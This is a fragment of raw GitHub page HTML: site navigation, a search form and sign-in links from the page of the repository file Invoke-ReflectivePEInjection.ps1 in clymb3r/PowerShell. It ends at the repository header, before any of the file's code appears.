  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to CI/CD &amp;amp; Automation&quot;,&quot;label&quot;:&quot;ref_cta:CI/CD &amp;amp; Automation;&quot;}" href="/solutions/ci-cd/">
      CI/CD &amp; Automation

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to DevOps&quot;,&quot;label&quot;:&quot;ref_cta:DevOps;&quot;}" href="https://resources.github.com/devops/">
      DevOps

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to DevSecOps&quot;,&quot;label&quot;:&quot;ref_cta:DevSecOps;&quot;}" href="https://resources.github.com/devops/fundamentals/devsecops/">
      DevSecOps

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

          </ul>
          <ul class="list-style-none f5 ">
              <li class="h4 color-fg-default my-1">Case Studies</li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Customer Stories&quot;,&quot;label&quot;:&quot;ref_cta:Customer Stories;&quot;}" href="/customer-stories">
      Customer Stories

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Resources&quot;,&quot;label&quot;:&quot;ref_cta:Resources;&quot;}" href="https://resources.github.com/">
      Resources

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

          </ul>
      </div>
</li>


                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-3 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Open Source
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 py-2 py-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 px-lg-4">
          <ul class="list-style-none f5 border-bottom pb-3 mb-3">

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to GitHub Sponsors&quot;,&quot;label&quot;:&quot;ref_cta:GitHub Sponsors;&quot;}" href="/sponsors">
      
      <div>
        <div class="color-fg-default h4">GitHub Sponsors</div>
        Fund open source developers
      </div>

    
</a></li>

          </ul>
          <ul class="list-style-none f5 border-bottom pb-3 mb-3">

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to The ReadME Project&quot;,&quot;label&quot;:&quot;ref_cta:The ReadME Project;&quot;}" href="/readme">
      
      <div>
        <div class="color-fg-default h4">The ReadME Project</div>
        GitHub community articles
      </div>

    
</a></li>

          </ul>
          <ul class="list-style-none f5 ">
              <li class="h4 color-fg-default my-1">Repositories</li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to Topics&quot;,&quot;label&quot;:&quot;ref_cta:Topics;&quot;}" href="/topics">
      Topics

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to Trending&quot;,&quot;label&quot;:&quot;ref_cta:Trending;&quot;}" href="/trending">
      Trending

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to Collections&quot;,&quot;label&quot;:&quot;ref_cta:Collections;&quot;}" href="/collections">
      Collections

    
</a></li>

          </ul>
      </div>
</li>


                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
    <a class="HeaderMenu-link no-underline px-0 px-lg-2 py-3 py-lg-2 d-block d-lg-inline-block" data-analytics-event="{&quot;category&quot;:&quot;Header menu top item (logged out)&quot;,&quot;action&quot;:&quot;click to go to Pricing&quot;,&quot;label&quot;:&quot;ref_cta:Pricing;&quot;}" href="/pricing">Pricing</a>
</li>

            </ul>
          </nav>

        <div class="d-lg-flex flex-items-center px-3 px-lg-0 mb-3 mb-lg-0 text-center text-lg-left">
            <div class="d-lg-flex min-width-0 mb-2 mb-lg-0">
              



<div class="header-search flex-auto position-relative js-site-search flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to"
>
  <div class="position-relative">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-site-search-form" role="search" aria-label="Site" data-scope-type="Repository" data-scope-id="9093330" data-scoped-search-url="/clymb3r/PowerShell/search" data-owner-scoped-search-url="/users/clymb3r/search" data-unscoped-search-url="/search" data-turbo="false" action="/clymb3r/PowerShell/search" accept-charset="UTF-8" method="get">
      <label class="form-control header-search-wrapper input-sm p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
        <input type="text"
          class="form-control js-site-search-focus header-search-input jump-to-field js-jump-to-field js-site-search-field is-clearable"
          data-hotkey=s,/
          name="q"
          
          placeholder="Search"
          data-unscoped-placeholder="Search GitHub"
          data-scoped-placeholder="Search"
          autocapitalize="off"
          role="combobox"
          aria-haspopup="listbox"
          aria-expanded="false"
          aria-autocomplete="list"
          aria-controls="jump-to-results"
          aria-label="Search"
          data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations"
          spellcheck="false"
          autocomplete="off"
        >
        <input type="hidden" data-csrf="true" class="js-data-jump-to-suggestions-path-csrf" value="dIt1Q+we6NfY37nqxlUc2Skec3VlCbvP/1o0Vi7GYAugurPYbyiL4KMU1l2W//Mt+bsMPr3RZPmuE9cmO4nTZw==" />
        <input type="hidden" class="js-site-search-type-field" name="type" >
            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="20" aria-hidden="true" class="mr-1 header-search-key-slash"><path fill="none" stroke="#979A9C" opacity=".4" d="M3.5.5h12c1.7 0 3 1.3 3 3v13c0 1.7-1.3 3-3 3h-12c-1.7 0-3-1.3-3-3v-13c0-1.7 1.3-3 3-3z"></path><path fill="#979A9C" d="M11.8 6L8 15.1h-.9L10.8 6h1z"></path></svg>


          <div class="Box position-absolute overflow-hidden d-none jump-to-suggestions js-jump-to-suggestions-container">
            
<ul class="d-none js-jump-to-suggestions-template-container">
  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-suggestion" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="suggestion">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg title="Repository" aria-label="Repository" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo js-jump-to-octicon-repo d-none flex-shrink-0">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
      <svg title="Project" aria-label="Project" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project js-jump-to-octicon-project d-none flex-shrink-0">
    <path d="M1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0ZM1.5 1.75v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25ZM11.75 3a.75.75 0 0 1 .75.75v7.5a.75.75 0 0 1-1.5 0v-7.5a.75.75 0 0 1 .75-.75Zm-8.25.75a.75.75 0 0 1 1.5 0v5.5a.75.75 0 0 1-1.5 0ZM8 3a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 3Z"></path>
</svg>
      <svg title="Search" aria-label="Search" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search js-jump-to-octicon-search d-none flex-shrink-0">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

</ul>

<ul class="d-none js-jump-to-no-results-template-container">
  <li class="d-flex flex-justify-center flex-items-center f5 d-none js-jump-to-suggestion p-2">
    <span class="color-fg-muted">No suggested jump to results</span>
  </li>
</ul>

<ul id="jump-to-results" role="listbox" class="p-0 m-0 js-navigation-container jump-to-suggestions-results-container js-jump-to-suggestions-results-container">
  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-scoped-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="scoped_search">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg title="Repository" aria-label="Repository" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo js-jump-to-octicon-repo d-none flex-shrink-0">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
      <svg title="Project" aria-label="Project" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project js-jump-to-octicon-project d-none flex-shrink-0">
    <path d="M1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0ZM1.5 1.75v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25ZM11.75 3a.75.75 0 0 1 .75.75v7.5a.75.75 0 0 1-1.5 0v-7.5a.75.75 0 0 1 .75-.75Zm-8.25.75a.75.75 0 0 1 1.5 0v5.5a.75.75 0 0 1-1.5 0ZM8 3a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 3Z"></path>
</svg>
      <svg title="Search" aria-label="Search" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search js-jump-to-octicon-search d-none flex-shrink-0">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-owner-scoped-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="owner_scoped_search">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg title="Repository" aria-label="Repository" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo js-jump-to-octicon-repo d-none flex-shrink-0">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
      <svg title="Project" aria-label="Project" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project js-jump-to-octicon-project d-none flex-shrink-0">
    <path d="M1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0ZM1.5 1.75v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25ZM11.75 3a.75.75 0 0 1 .75.75v7.5a.75.75 0 0 1-1.5 0v-7.5a.75.75 0 0 1 .75-.75Zm-8.25.75a.75.75 0 0 1 1.5 0v5.5a.75.75 0 0 1-1.5 0ZM8 3a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 3Z"></path>
</svg>
      <svg title="Search" aria-label="Search" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search js-jump-to-octicon-search d-none flex-shrink-0">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this user">
        In this user
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-global-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="" data-item-type="global_search">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg title="Repository" aria-label="Repository" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo js-jump-to-octicon-repo d-none flex-shrink-0">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
      <svg title="Project" aria-label="Project" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project js-jump-to-octicon-project d-none flex-shrink-0">
    <path d="M1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0ZM1.5 1.75v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25ZM11.75 3a.75.75 0 0 1 .75.75v7.5a.75.75 0 0 1-1.5 0v-7.5a.75.75 0 0 1 .75-.75Zm-8.25.75a.75.75 0 0 1 1.5 0v5.5a.75.75 0 0 1-1.5 0ZM8 3a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 3Z"></path>
</svg>
      <svg title="Search" aria-label="Search" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search js-jump-to-octicon-search d-none flex-shrink-0">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-2 flex-shrink-0 color-bg-subtle px-1 color-fg-muted ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>


</ul>

          </div>
      </label>
</form>  </div>
</div>

            </div>

          <div class="position-relative mr-lg-3 d-lg-inline-block">
            <a href="/login?return_to=https%3A%2F%2Fgithub.com%2Fclymb3r%2FPowerShell%2Fblob%2Fmaster%2FInvoke-ReflectivePEInjection%2FInvoke-ReflectivePEInjection.ps1"
              class="HeaderMenu-link HeaderMenu-link--sign-in flex-shrink-0 no-underline d-block d-lg-inline-block border border-lg-0 rounded rounded-lg-0 p-2 p-lg-0"
              data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="3e916f92f982c2b99fc2c1388d3d941fe8c96e0c59d024444030403e6efb808d"
              data-ga-click="(Logged out) Header, clicked Sign in, text:sign-in">
              Sign in
            </a>
          </div>

            <a href="/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;source=header-repo&amp;source_repo=clymb3r%2FPowerShell"
              class="HeaderMenu-link HeaderMenu-link--sign-up flex-shrink-0 d-none d-lg-inline-block no-underline border color-border-default rounded px-2 py-1"
              data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="3e916f92f982c2b99fc2c1388d3d941fe8c96e0c59d024444030403e6efb808d"
              data-analytics-event="{&quot;category&quot;:&quot;Sign up&quot;,&quot;action&quot;:&quot;click to sign up for account&quot;,&quot;label&quot;:&quot;ref_page:/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show;ref_cta:Sign up;ref_loc:header logged out&quot;}"
            >
              Sign up
            </a>
        </div>
      </div>
    </div>
  </div>
</header>

    </div>

  <div id="start-of-content" class="show-on-focus"></div>







    <div id="js-flash-container" data-turbo-replace>





  <template class="js-flash-template">
    
<div class="flash flash-full   {{ className }}">
  <div class="px-2" >
    <button autofocus class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    <div aria-atomic="true" role="alert" class="js-flash-alert">
      
      <div>{{ message }}</div>

    </div>
  </div>
</div>
  </template>
</div>


    
    <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>






  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
  >
        <div itemscope itemtype="http://schema.org/SoftwareSourceCode" class="">
    <main id="js-repo-pjax-container" >
      
  


    






  
  <div id="repository-container-header"  class="pt-3 hide-full-screen" style="background-color: var(--color-page-header-bg);" data-turbo-replace>

      <div class="d-flex flex-wrap flex-justify-end mb-3  px-3 px-md-4 px-lg-5" style="gap: 1rem;">

        <div class="flex-auto min-width-0 width-fit mr-3">
            
  <div class=" d-flex flex-wrap flex-items-center wb-break-word f3 text-normal">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo color-fg-muted mr-2">
